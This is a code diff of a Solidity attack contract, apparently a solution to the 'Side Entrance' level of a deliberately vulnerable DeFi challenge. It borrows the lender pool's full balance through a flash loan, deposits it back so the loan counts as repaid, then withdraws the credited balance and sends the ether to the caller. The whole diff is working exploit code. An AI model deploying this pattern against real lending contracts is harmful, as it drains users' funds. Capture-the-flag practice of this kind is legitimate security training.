@@ -4,19 +4,23 @@ pragma solidity ^0.8.0;
 
 import "../side-entrance/SideEntranceLenderPool.sol";
 
-contract SideEntranceAttack {
-    address private _pool;
+contract SideEntranceAttack is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private pool;
 
-    function attack(address pool) external {
-        _pool = pool;
-        SideEntranceLenderPool(pool).flashLoan(pool.balance);
-        SideEntranceLenderPool(pool).withdraw();
+    // Entrypoint for attacker
+    function attack(SideEntranceLenderPool _pool) external {
+        pool = _pool;
+        _pool.flashLoan(address(pool).balance);
+        _pool.withdraw();
         payable(msg.sender).transfer(address(this).balance);
     }
 
-    function execute() external payable {
-        SideEntranceLenderPool(_pool).deposit{value: msg.value}();
+    // Called by the flash loaner
+    function execute() override external payable {
+        pool.deposit{value: msg.value}();
     }
 
+    // Need this so the flash loaner doesn't revert when it tries
+    // to send us ether
     receive() external payable {}
 }
